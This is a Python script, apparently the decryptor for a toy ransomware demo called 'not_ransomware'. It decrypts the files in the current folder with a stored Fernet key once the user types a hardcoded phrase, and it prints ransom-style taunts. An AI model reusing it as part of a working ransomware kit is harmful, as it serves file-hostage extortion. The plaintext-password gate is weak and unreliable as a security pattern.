#!/usr/bin/env python3
#
#  [Program]
#
#  decrypt not ransomeware
#
#  [Author]
#
#  Drew, https://github.com/Ahendrix9624/
#
#  [License]
#
#  This program is free software; you can redistribute it and/or modify
#  it under the terms of the GNU General Public License as published by
#  the Free Software Foundation; either version 3 of the License, or
#  any later version.
#
#  This program is distributed in the hope that it will be useful,
#  but WITHOUT ANY WARRANTY; without even the implied warranty of
#  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#  GNU General Public License for more details.
#
#  You should have received a copy of the GNU General Public License
#  along with this program; if not, write to the Free Software
#  Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA
#
#  See 'LICENSE' for more information.



import os
from cryptography.fernet import Fernet

#Find the Files we want to encrypt (^*_*^)

files = []

for file in os.listdir():
    if file == "not_ransomware" or file == "thekey.key" or file == "decrypt.py":
        continue
    if os.path.isfile(file):
        files.append(file)

with open("thekey.key", 'rb') as key:
    secretkey = key.read()

secretphrase = "password"
user_phrase = input("Enter the secret phrase to decrypt your files\n")

if user_phrase == secretphrase:
    for file in files:
            with open(file, "rb") as thefile:
                    contents = thefile.read()
            contents_decrypted = Fernet(secretkey).decrypt(contents)
            with open(file, "wb") as thefile:
                    thefile.write(contents_decrypted)
            print("Congrats your files are decrypted. Enjoy the rest of your day.")
else:
    print("Wrong password. Cant brute force this bad boy!")